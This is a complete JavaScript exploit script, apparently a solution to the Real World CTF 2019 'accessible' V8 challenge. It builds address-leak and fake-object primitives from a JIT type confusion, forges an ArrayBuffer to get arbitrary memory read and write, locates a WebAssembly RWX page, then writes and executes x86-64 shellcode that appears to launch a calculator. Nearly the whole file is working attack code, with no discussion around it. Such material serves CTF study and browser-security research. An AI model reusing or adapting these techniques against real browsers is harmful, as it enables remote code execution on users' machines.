/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-05-09 19:56:59
 * Author: raycp
 * 
 * Last Modified: 2020-05-10 16:40:05
 * Description: exp for rwctf 2019 accessible 
************************************************************/

const MAX_ITERATIONS = 0x10000;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16);
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;  
}
// wasm obj
wasm_obj = wasm_func();
//%DebugPrint(func);
//%SystemBreak();
// gc function to move data to old space
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

// function to build a random named property
function random_string(len) {
　　len = len || 32;
　　var chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';  
　　var maxPos = chars.length;
　　var pwd = '';
　　for (i = 0; i < len; i++) {
　　　　pwd += chars.charAt(Math.floor(Math.random() * maxPos));
　　}
　　return pwd;
}

// vuln func to build addr_of primitive
function addr_of_foo(obj)
{
    return obj.x.a;
}

// addr_of primitive
var addr_of_obj = {};
addr_of_obj.x = {a: 1.1};
function addr_of(obj)
{
    let name = random_string(3);
    let tmp = {};
    tmp[name] = obj;
    addr_of_obj.x = tmp;

    return f2i(addr_of_foo(addr_of_obj));
}

for(let i=0; i<MAX_ITERATIONS; i++) {
    addr_of_foo(addr_of_obj);
}

// vuln func to build fake_obj primitive
function fake_obj_foo(obj)
{
    return obj.y.b;
}

// fake_obj primitive
var fake_obj_obj = {y: {b: {}}};
function fake_obj(addr)
{
    let name = random_string(4);
    let tmp = {};
    tmp[name] = i2f(addr);
    fake_obj_obj.y = tmp;
    return fake_obj_foo(fake_obj_obj);
    
}


for(let i=0; i<MAX_ITERATIONS; i++) {
    fake_obj_foo(fake_obj_obj);
}


var ab = new ArrayBuffer(200);

// pading to form the heap layout
var pading0 = [
    i2f(0xdaba0000daba0000), // map, whatever;
    i2f(0x000900c31f000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
].splice(0)

// pading to form the heap layout
var pading1 = [
    i2f(0xdaba0000daba0000), // map, whatever;
    i2f(0x000900c31f000008),
    i2f(0x00000000082003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
].splice(0)

// array to build fake ArrayBuffer map
var fake_ab_map = [
    i2f(0xdaba0000daba0000), // map, whatever;
    //i2f(0x0001f000008),
    i2f(0x1900042317080808),
    i2f(0x00000000084003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
].splice(0)

// array to build fake ArrayBuffer
var fake_ab = [
    1.1, // ArrayBuffer Map;
    2.2,  // properties (whatever);
    3.3,  // elements (whatever);
    i2f(0x400), // length 0x400
    4.4, // backing store;
    i2f(0x0000000000000002), // copy form ab stucture
    i2f(0),
    i2f(0)
].splice(0)

// trigger gc to mov the upper data to old space
gc();
gc();

// step 1. get the prototype of ArrayBuffer Map
var ab_map_proto_addr = addr_of(ab.__proto__);
var ab_map_construct_addr = ab_map_proto_addr - 0x198;
print("[+] ArrayBuffer Map prototype addr: 0x"+hex(ab_map_proto_addr));
print("[+] ArrayBuffer Map Constructor addr: 0x"+hex(ab_map_construct_addr));
// %DebugPrint(ab);
// %SystemBreak();
// step 2. use the ab_map_proto_addr and ab_map_construct_addr to build fake ArrayBuffer Map
// %DebugPrint(fake_ab_map);
// %SystemBreak();
fake_ab_map[3] = i2f(ab_map_proto_addr);
fake_ab_map[4] = i2f(ab_map_construct_addr);

// step 3. get the fake ArrayBuffer Map elements' addr
var fake_ab_map_addr = addr_of(fake_ab_map) - 0x30; // elements addr of fake_ab_map
print("[+] fake ArrayBuffer Map addr: 0x"+hex(fake_ab_map_addr));

// step 4. use the fakeABMapAddr to build fakeAB;
fake_ab[0] = i2f(fake_ab_map_addr);
fake_ab[1] = i2f(fake_ab_map_addr);
// %DebugPrint(fake_ab_map);
// %SystemBreak();

// step 5. get the fake ArrayBuffer elements' addr
var fake_ab_addr = addr_of(fake_ab) - 0x40 ; // elements addr of fakeAB
print ("[+] fake ArrayBuffer addr: 0x"+hex(fake_ab_addr));
// %DebugPrint(fake_ab);
//%SystemBreak();

// step 6. get fake ArrayBuffer object with fake_obj primitive
var fake_ab_obj = fake_obj(fake_ab_addr);
// %DebugPrint(fake_ab_obj);
// print(fake_ab_obj);
// %DebugPrint(fake_obj_obj.y);
//%DebugPrint(ab);
//%SystemBreak();

// step 7. build DataView obj
var dataView = new DataView(fake_ab_obj);
// %DebugPrint(fake_ab_obj);
//%SystemBreak()

// aar primitive
function data_view_read64(addr)
{
    fake_ab[4] = i2f(addr); // overwrite fakeAB[4], which is corresponding to backing store pointer

    return f2i(dataView.getFloat64(0, true));
}

// aaw primitive
function data_view_write(addr, payload)
{

    fake_ab[4] = i2f(addr);

    for (let i=0; i<payload.length; i++) {
        dataView.setUint8(i, payload[i]);
    }
    return ;
}


// step 8. leak rwx memory here
// %DebugPrint(wasm_obj);
// %SystemBreak();
var wasm_obj_addr = addr_of(wasm_obj)-1;
print("[+] wasm obj addr: 0x"+hex(wasm_obj_addr));
var shared_info_addr = data_view_read64(wasm_obj_addr+0x18)-1;
print("[+] wasm shared info addr: 0x"+hex(shared_info_addr));
var wasm_exported_function_data_addr = data_view_read64(shared_info_addr+8)-1;
print("[+] wasmExportedFunctionData addr addr: 0x"+hex(wasm_exported_function_data_addr));
var instance_addr = data_view_read64(wasm_exported_function_data_addr+0x10)-1;
print("[+] instance  addr: 0x"+hex(instance_addr));
var rwx_addr = data_view_read64(instance_addr+0x80);
print("[+] rwx addr: 0x"+hex(rwx_addr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// step 9. write shellcode to jit code
data_view_write(rwx_addr, shellcode);
// step 10. trigger jit function to run shellcode
wasm_obj();
